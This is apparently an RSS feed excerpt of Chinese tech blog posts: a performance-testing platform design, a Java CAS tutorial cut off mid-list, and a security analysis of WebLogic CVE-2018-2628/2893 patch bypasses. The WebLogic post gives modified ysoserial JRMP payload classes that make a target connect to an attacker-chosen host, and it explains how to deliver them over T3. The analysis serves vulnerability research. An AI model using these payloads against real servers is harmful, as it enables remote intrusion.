<dc:creator>程序员欣宸</dc:creator>
<og:description>OpenWrite版： 欢迎访问我的GitHub https://github.com/zq2599/blog_demos 内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kuber</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bolingcavalry/p/14296129.html</dc:identifier>
</item>
<item>
<title>聊聊性能测试平台 - 宝路</title>
<link>http://www.cnblogs.com/leebaul/p/14295142.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/leebaul/p/14295142.html</guid>
<description>&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;在刚过去的2020年，我司的全链路压测平台已成功落地。今天呢，宝路就来聊聊自己对性能测试平台设计的一些想法与思考！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1708399/202101/1708399-20210118210640163-1556498976.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;2.1 需求工作流&lt;/h2&gt;
&lt;blockquote readability=&quot;24&quot;&gt;
&lt;p&gt;工作流确保了测试按约定步骤推进，同时让工作的透明度和可再现性。我们工作中常用的有JIRA、TAPD等。平台是完全可以与之进行对接的。&lt;/p&gt;
&lt;p&gt;通常情况下压测需求可能由开发部门、业务部门、运维部门发起，测试组接收到压测需求后需要对测试需求调研、评估。&lt;/p&gt;
&lt;p&gt;压测需求通过评审后，测试组根据实际情况进行排期、制定压测方案计划。测试组完成压测方案计划后可向项目发起方案评审。多方会议评审通过后，则可进入压测实施、直至测试组完成压测工作，发出性能测试报告。&lt;/p&gt;
&lt;p&gt;上面所述的是一个大致的流程，在实施的过程会遇到各种各样的困境，导致流程很难推进下去。&lt;/p&gt;
&lt;p&gt;往往很多时候大家对系统性能的认知还不够深刻。本应该做压测的项目却被项目组忽视性能测试，在系统上后引发性能问题；测试跟开发的关系一直很微妙，测试发现的问题多，开发就不happy了（又该挨批了）！测试发现的问题少，上面领导就不happy了（养测试时干什么吃的。。。。）！&lt;/p&gt;
&lt;p&gt;开发人员心理叫苦，测试人员也是黯然神伤！今天就不过多展开聊，宝路后面计划专门开一篇 “如何做好性能测试”的文章。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;2.2 测试脚本管理&lt;/h2&gt;
&lt;blockquote readability=&quot;21&quot;&gt;
&lt;p&gt;脚本在线编辑：支持测试人员调整脚本，如调整并发用户、压测环境、参数数据等。&lt;/p&gt;
&lt;p&gt;脚本克隆：为了测试人员在不改动父脚本的前提下，快速拷贝以达到测试人员快速编写调整脚本。&lt;/p&gt;
&lt;p&gt;脚本录制：目前大概有四种脚本编写方式：1.纯手工编写（相对比较慢）、2.JMeter代理录制（感觉不好用）3.Fiddler抓包工具插件转jmx脚本（目前对脚本的兼容性有待考察）4.采用meterSphere的录制插件（目前开源，非常推荐使用）。&lt;/p&gt;
&lt;p&gt;脚本一键上传：两种方式：1.传统的文件上传（平台页面点击上传&amp;gt;选择脚本文件进行上传）、2.插件方式（单独开发JMeter插件，GUI模式下编写完脚本后点击上按钮默认直接上传当前脚本及参数化文件，非常的方便，大家可参考bzm开源的插件自行开发）。&lt;/p&gt;
&lt;p&gt;脚本标签：这个功能是为了更好的对测试脚本进行快速查找区分，测试人员可根据自定义的标签来实现快速查找脚本。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;2.3 库文件、插件管理&lt;/h2&gt;
&lt;blockquote readability=&quot;20&quot;&gt;
&lt;p&gt;在使用JMeter测试工具测试，大家肯定经常会遇到一个问题那就是经常要上传一些插件（需放lib/ext目录下）和依赖的库文件（需放lib目录下）。如果不做统一管理，很容易出现jar包冲突、覆盖其他人上传的包等现象，进而造成测试失败。&lt;/p&gt;
&lt;p&gt;那么怎么规避呢？咱们其实可以从用户角度分析，比如：测试用户A在做某个项目时需要上传一个A1插件或A1库文件，但是这个插件或文件对测试用户B根本就用不到。&lt;/p&gt;
&lt;p&gt;那就各子维护自己的插件就完事了呗，普通用户自己上传的插件只对自己生效或者可见，那些通用的插件，比如特殊Thread Group、TPS、Shaping Timer等插件则可由组长或者管理员账户统一来维护。这些插件对特定组员或者普通测试用户可见，且不可编辑（防止乱删）。&lt;/p&gt;
&lt;p&gt;场景执行前先对salve机器进行数据同步，比如参数文件、插件和库文件、服务器时间等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;2.4 数据、环境管理&lt;/h2&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;修改数据文件：压测的时候经常会遇到脚本中包含了某些参数文件。特别是消耗性的数据，会让人难受。。。。要反复的搞很多个参数化文件，然后再对每个slave机进行替换。既然有了性能平台，那性能平台就应该支持在线修改参数据、一键同步文件。记住这种消耗性的数据一定要进行数据分块。不然在压测过程数据库会形成大量锁等待，造成TPS较低。&lt;/p&gt;
&lt;p&gt;环境管理：这个应该很好理解，测试人员可提前维护好各个环境。总之一句话说：“脚本不应依赖于环境”。脚本在运行的时候是可以选择环境的，而不是在脚本中固定请求地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;2.5 压力机管理&lt;/h2&gt;
&lt;blockquote readability=&quot;18&quot;&gt;
&lt;p&gt;智能调度：根据测试脚本中总并发用户，智能分配压力机，进而达到slave机资源利用率最大化。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;监控状态：测试人员可查看压测过程中，所用到slave机的资源消耗情况。如果发现cpu资源消耗较高，可重新配置slave机的并发分配占比，进而达到最优测试结果的目的。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;手动启停：在测试过程中，如遇slave状态异常，测试人员可在平台上对slave机进行人为的启停。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;自动熔断：在测试过程中，如果在某一段连续时间内，出现大量失败请求，此时salve自动触发停止测试场景，以此来保护被测系统。常用的开源插件有 AutoStop Listener。这个是一个值得探讨的问题，到底是应该停止压测场景，还是停止某些slave机？是maser发起停止全部 还是salve之间互相通知？关于这块，宝路这边也计划深入研究一下，毕竟总有更好的办法！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;2.6 配置管理&lt;/h2&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;容器配置：为每台容器salve机器配置并发用户上限、cpu数等。&lt;/p&gt;
&lt;p&gt;定时任务：测试人员可以配置计划任务，来达到定制执行压测计划的目的。&lt;/p&gt;
&lt;p&gt;挡板配置：支持部署单独的挡板模块。配置管理请求地址、接口报文、交易延迟等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;2.7 实时监控&lt;/h2&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;性能数据结果实时展示：常见的方案有两种：一是采用InfluxDB+ Grafana的解决方案（这里也有“坑”，以后宝路会写文章来分析）；二是采用MySQL+Echars +Kafka的解决方案。&lt;/p&gt;
&lt;p&gt;被测系统资源监控：解决方案：Collectd+InfluxDB+ Grafana&lt;/p&gt;
&lt;p&gt;以上所述的方案，宝路更倾向与采用InfluxDB+ Grafana的解决方案。至于原因嘛，暂且不谈。当然了想做好这些肯定不容易，每个都需要你去了解，不能光看看网上的帖子就以为自己会了。。。有好多东西都是值得深挖的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; 2.8 测试报告&lt;/h2&gt;
&lt;blockquote readability=&quot;15&quot;&gt;
&lt;p&gt;邮件发送：这个功能肯定是常用功能，值得讨论的就是制定一个能满足自己的报告模板。其核心主题就是怎么展示才能让不懂性能的人看明白，也就是所谓的通俗易懂。。。不能总站在自己的角度考虑问题，对吧！&lt;/p&gt;
&lt;p&gt;报告共享：邮件的方式算其中一种，测试人员也可以采用共享的方式，给制定人员共享测试报告。该用户通过登录平台或者制定连接均可查看。&lt;/p&gt;
&lt;p&gt;系统测评：当测试人员完成压测需求后，会根据测试结果再结合约定的规则对系统进行评分，再由测试组长复评。这个规则是值得商榷的。。。比如可以根据不同并发用户下的接口响应时间、系统资源消耗等方面进行规则制定。通过不断的完善，以达成大家均认可的一个评分规则。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;2.9 系统管理&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;  这个就简要说了，常用的数据清理功能，可以按时间段清理测试结果，来确保磁盘预留足够的空间，其包含了一些常用的用户权限管理、用户的增删改等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;2.10 REST API&lt;/h2&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;作为一个测试平台，无论功能还是性能，其实都绕不开CI/CD、DevOps。关于这个趋势想必也不需要宝路来过多叙述了。&lt;/p&gt;
&lt;p&gt;这就意味着，平台必须要具备这个能力！外部系统可以通过平台API方便的调用平台的服务。图中也仅是举个几个API的例子，为更好的适配，更多的API服务是非常值得开发和研究的。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Mon, 18 Jan 2021 22:37:00 +0000</pubDate>
<dc:creator>宝路</dc:creator>
<og:description>1. 背景 在刚过去的2020年，我司的全链路压测平台已成功落地。今天呢，宝路就来聊聊自己对性能测试平台设计的一些想法与思考！ 2. 平台思维导 2.1 需求工作流 工作流确保了测试按约定步骤推进，同</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/leebaul/p/14295142.html</dc:identifier>
</item>
<item>
<title>Java 安全之Weblogic 2018-2628&amp;2018-2893分析 - nice_0e3</title>
<link>http://www.cnblogs.com/nice0e3/p/14296052.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nice0e3/p/14296052.html</guid>
<description>&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
&lt;p&gt;续上一个weblogic T3协议的反序列化漏洞接着分析该补丁的绕过方式，根据weblogic的补丁还是挺难找的，后面的分析中没有补丁看不到weblogic修复的细节，但是也不难猜处weblogic的这些修复都是老做法，使用黑名单的方式去进行修补漏洞。&lt;/p&gt;
&lt;h2 id=&quot;0x01-补丁分析&quot;&gt;0x01 补丁分析&lt;/h2&gt;
&lt;p&gt;由于没拿到补丁，这里从廖师傅文章里面扣除补丁的细节。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected Class&amp;lt;?&amp;gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
   String[] arr$ = interfaces;
   int len$ = interfaces.length;
   for(int i$ = 0; i$ &amp;lt; len$; ++i$) {
      String intf = arr$[i$];
      if(intf.equals(&quot;java.rmi.registry.Registry&quot;)) {
         throw new InvalidObjectException(&quot;Unauthorized proxy deserialization&quot;);
      }
   }
   return super.resolveProxyClass(interfaces);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream&lt;/code&gt;类的地方添加了一个&lt;code&gt;resolveProxyClass&lt;/code&gt;方法，将&lt;code&gt;resolveProxyClass&lt;/code&gt;给重写了，添加了一个传递过来的数据对应的接口进行遍历验证，如果为&lt;code&gt;java.rmi.registry.Registry&lt;/code&gt;的话就直接抛出异常。如果不为&lt;code&gt;java.rmi.registry.Registry&lt;/code&gt;就调用父类的&lt;code&gt;resolveProxyClass&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;0x02-绕过思路&quot;&gt;0x02 绕过思路&lt;/h2&gt;
&lt;p&gt;在2018-2628的绕过方式其实有两种，分别是：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;在补丁里面仅仅只是限制了需要反序列化的数据为&lt;code&gt;使用java.rmi.registry.Registry&lt;/code&gt;以外的类的接口，但是其实远程对象的接口不止&lt;code&gt;java.rmi.registry.Registry&lt;/code&gt;这么一个。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;廖师傅这里提供的绕过方式是将该接口替换成&lt;code&gt;java.rmi.activation.Activator&lt;/code&gt;。即可绕过。&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;ysoserial修改把Proxy部分去除掉，即可绕过补丁。这里来思考一下为什么Proxy部分去除就可以绕过了呢？&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;在前面的原生readobject分析文章里面讲到过readobject里面会走两个分支，反序列化的是动态代理的对象的话就会走&lt;code&gt;resolveProxyClass&lt;/code&gt;分支里面，这里去除了Proxy部分内容，也就是说不使用动态代理的方式生成payload进行反序列化自然不会走到&lt;code&gt;resolveProxyClass&lt;/code&gt;分支里面去。&lt;/p&gt;
&lt;h2 id=&quot;0x03-利用思路&quot;&gt;0x03 利用思路&lt;/h2&gt;
&lt;p&gt;后面的调试内容，其实和前面的都是一样的，这里直接讲讲利用。&lt;/p&gt;
&lt;h3 id=&quot;改写ysoserial&quot;&gt;改写ysoserial&lt;/h3&gt;
&lt;p&gt;利用思路一,不使用代理对象：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package ysoserial.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.util.Random;



public class JRMPClient1 extends PayloadRunner implements ObjectPayload&amp;lt;Object&amp;gt; {

    public Object getObject(final String command) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep &amp;lt; 0) {
            port = new Random().nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return ref;
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient1.class.getClassLoader());
        PayloadRunner.run(JRMPClient1.class, args);
    }
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对JRMPClient做一个小小的改动。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210119021802732-1199422589.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;利用方式二，修改实现的远程接口为&lt;code&gt;java.rmi.activation.Activator&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package ysoserial.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;


@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)
@Authors({ Authors.MBECHLER })
public class JRMPClient2 extends PayloadRunner implements ObjectPayload&amp;lt;Activator&amp;gt; {

    public Activator getObject (final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep &amp;lt; 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[] {
            Activator.class
        }, obj);
        return proxy;
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
        PayloadRunner.run(JRMPClient2.class, args);
    }
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210119021815781-966744890.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x04-cve-2018-2893&quot;&gt;0x04 CVE-2018-2893&lt;/h2&gt;
&lt;p&gt;CVE-2018-2893是CVE2018-2628的绕过，先来查看一下CVE-2018-2628的补丁细节&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]{&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;, &quot;org.codehaus.groovy.runtime.ConversionHandler&quot;, &quot;org.codehaus.groovy.runtime.MethodClosure&quot;, &quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;, &quot;sun.rmi.server.UnicastRef&quot;};
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;改写ysoserial-1&quot;&gt;改写ysoserial&lt;/h3&gt;
&lt;p&gt;这里利用方式是将远程的gadget对象封装进&lt;code&gt;streamMessageImpl&lt;/code&gt;类里面，和CVE-2016-0638一样，不过这里用的是JRMPClient的gadget。&lt;/p&gt;
&lt;p&gt;在改写的时候需要，注意几个细节。JDK里面没有&lt;code&gt;streamMessageImpl&lt;/code&gt;类，这里需要讲weblogic的一些依赖jar包和类的代码给复制过来。这里是讲weblogic_cmd里面的部分内容扣出来放到了yso里面。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package ysoserial.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import weblogic.jms.common.StreamMessageImpl;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;


@SuppressWarnings ( {
    &quot;restriction&quot;
} )
@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)
@Authors({ Authors.MBECHLER })
public class JRMPClient3 extends PayloadRunner implements ObjectPayload&amp;lt;Object&amp;gt; {

    public Object streamMessageImpl(byte[] object) {
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(object, object.length);
        return streamMessage;
    }

    public Object getObject (final String command ) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep &amp;lt; 0) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler);
        return streamMessageImpl(Serializer.serialize(object));
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient3.class, args);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210119021828604-367905673.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;参考文章&quot;&gt;参考文章&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://y4er.com/post/weblogic-jrmp/&quot; target=&quot;_blank&quot;&gt;Weblogic JRMP反序列化及绕过分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/afanti/p/10256840.html&quot; target=&quot;_blank&quot;&gt;weblogic之CVE-2017-3248，CVE-2018-2628,CVE-2018-2893，CVE-2018-3245反序列绕过分析&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x05-末尾的絮絮叨叨&quot;&gt;0x05 末尾的絮絮叨叨&lt;/h2&gt;
&lt;p&gt;其实知道绕过方式和利用方式后，从yso进行一个修改打包成jar包，使用到上次2017-3248的时候用到的exp修改参数，通过T3协议发送payload过去就可以实现绕过了。和前面的内容都是一样的都是同一个漏洞，所以在这里不做多的赘述。&lt;/p&gt;
</description>
<pubDate>Mon, 18 Jan 2021 18:19:00 +0000</pubDate>
<dc:creator>nice_0e3</dc:creator>
<og:description>Java 安全之Weblogic 2018-2628&amp;amp;amp;2018-2893分析 0x00 前言 续上一个weblogic T3协议的反序列化漏洞接着分析该补丁的绕过方式，根据weblog</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/nice0e3/p/14296052.html</dc:identifier>
</item>
<item>
<title>Java并发/多线程-CAS原理分析 - 阿墩</title>
<link>http://www.cnblogs.com/aduner/p/14296008.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/aduner/p/14296008.html</guid>
<description>&lt;p&gt;CAS 即 compare and swap，比较并交换。&lt;/p&gt;
&lt;p&gt;CAS是一种原子操作，同时 CAS 使用乐观锁机制。&lt;/p&gt;
&lt;p&gt;J.U.C中的很多功能都是建立在 CAS 之上，各种原子类，其底层都用 CAS来实现原子操作。用来解决并发时的安全问题。&lt;/p&gt;

&lt;h2 id=&quot;举一个典型的例子i&quot;&gt;举一个典型的例子&lt;code&gt;i++&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class AddTest {
  public volatile int i;
  public void add() {
    i++;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过&lt;code&gt;javap -c AddTest&lt;/code&gt;可以看到add 方法的字节码指令：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void add();
    Code:
       0: aload_0
       1: dup
       2: getfield      #2                  // Field i:I
       5: iconst_1
       6: iadd
       7: putfield      #2                  // Field i:I
      10: return
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;i++&lt;/code&gt;被拆分成了多个指令：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;执行&lt;code&gt;getfield&lt;/code&gt;拿到原始内存值；&lt;/li&gt;
&lt;li&gt;执行&lt;code&gt;iadd&lt;/code&gt;进行加 1 操作；&lt;/li&gt;
&lt;li&gt;执行&lt;code&gt;putfield&lt;/code&gt;写把累加后的值写回内存。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;假设一种情况：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;当&lt;code&gt;线程 1&lt;/code&gt; 执行到&lt;code&gt;iadd&lt;/code&gt;时，由于还没有执行&lt;code&gt;putfield&lt;/code&gt;，这时候并不会刷新主内存区中的值。&lt;/li&gt;
&lt;li&gt;此时&lt;code&gt;线程 2&lt;/code&gt; 进入开始运行，刚刚将主内存区的值拷贝到私有内存区。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;线程 1&lt;/code&gt;正好执行&lt;code&gt;putfield&lt;/code&gt;，更新主内存区的值，那么此时&lt;code&gt;线程 2&lt;/code&gt; 的副本就是旧的了。错误就出现了。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;如何解决？&quot;&gt;如何解决？&lt;/h2&gt;
&lt;p&gt;最简单的，在 add 方法加上 synchronized 。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class AddTest {
  public volatile int i;
  public synchronized void add() {
    i++;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;虽然简单，并且解决了问题，但是性能表现并不好。&lt;/p&gt;
&lt;p&gt;最优的解法应该是使用JDK自带的&lt;strong&gt;CAS&lt;/strong&gt;方案，如上例子，使用&lt;code&gt;AtomicInteger&lt;/code&gt;类&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class AddIntTest {
  public AtomicInteger i;
  public void add() {
    i.getAndIncrement();
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;底层原理&quot;&gt;底层原理&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;CAS 的原理并不复杂：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;三个参数，一个当前内存值 V、预期值 A、更新值 B&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;当且仅当预期值 A 和内存值 V 相同时，将内存值修改为 B 并返回 true&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;否则什么都不做，并返回 false&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;拿 &lt;code&gt;AtomicInteger&lt;/code&gt; 类分析，先来看看源码：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;我这里的环境是Java11，如果是Java8这里一些内部的一些命名有些许不同。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class AtomicInteger extends Number implements java.io.Serializable {
    private static final long serialVersionUID = 6214790243416807050L;

    /*
     * This class intended to be implemented using VarHandles, but there
     * are unresolved cyclic startup dependencies.
     */
    private static final jdk.internal.misc.Unsafe U = jdk.internal.misc.Unsafe.getUnsafe();
    private static final long VALUE = U.objectFieldOffset(AtomicInteger.class, &quot;value&quot;);

    private volatile int value;
  
                //...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Unsafe&lt;/code&gt; 类，该类对一般开发而言，少有用到。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Unsafe&lt;/code&gt; 类底层是用 C/C++ 实现的，所以它的方式都是被 native 关键字修饰过的。&lt;/p&gt;
&lt;p&gt;它可以提供硬件级别的原子操作，如获取某个属性在内存中的位置、修改对象的字段值。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;AtomicInteger&lt;/code&gt; 类存储的值在 &lt;code&gt;value&lt;/code&gt; 字段中，而&lt;code&gt;value&lt;/code&gt;字段被&lt;code&gt;volatile&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;在静态代码块中，并且获取了 &lt;code&gt;Unsafe&lt;/code&gt; 实例，获取了 &lt;code&gt;value&lt;/code&gt; 字段在内存中的偏移量 &lt;code&gt;VALUE&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;接下回到刚刚的例子：&lt;/p&gt;
&lt;p&gt;如上，&lt;code&gt;getAndIncrement()&lt;/code&gt; 方法底层利用 CAS 技术保证了并发安全。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final int getAndIncrement() {
  return U.getAndAddInt(this, VALUE, 1);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;getAndAddInt()&lt;/code&gt; 方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final int getAndAddInt(Object o, long offset, int delta) {
  int v;
  do {
    v = getIntVolatile(o, offset);
  } while (!weakCompareAndSetInt(o, offset, v, v + delta));
  return v;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;v&lt;/code&gt; 通过 &lt;code&gt;getIntVolatile(o, offset)&lt;/code&gt;方法获取，其目的是获取 &lt;code&gt;o&lt;/code&gt; 在 &lt;code&gt;offset&lt;/code&gt; 偏移量的值，其中 &lt;code&gt;o&lt;/code&gt; 就是 &lt;code&gt;AtomicInteger&lt;/code&gt; 类存储的值，即&lt;code&gt;value&lt;/code&gt;， &lt;code&gt;offset&lt;/code&gt; 内存偏移量的值，即 &lt;code&gt;VALUE&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重点&lt;/strong&gt;，&lt;code&gt;weakCompareAndSetInt&lt;/code&gt; 就是实现 &lt;strong&gt;CAS 的核心方法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果 &lt;code&gt;o&lt;/code&gt; 和 &lt;code&gt;v&lt;/code&gt;相等，就证明没有其他线程改变过这个变量，那么就把 &lt;code&gt;v&lt;/code&gt; 值更新为 &lt;code&gt;v + delta&lt;/code&gt;，其中 &lt;code&gt;delta&lt;/code&gt; 是更新的增量值。&lt;/li&gt;
&lt;li&gt;反之 CAS 就一直采用自旋的方式继续进行操作，这一步也是一个原子操作。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;设定 &lt;code&gt;AtomicInteger&lt;/code&gt; 的原始值为 A，&lt;code&gt;线程 1&lt;/code&gt; 和&lt;code&gt;线程 2&lt;/code&gt; 各自持有一份副本，值都是 A。&lt;/li&gt;
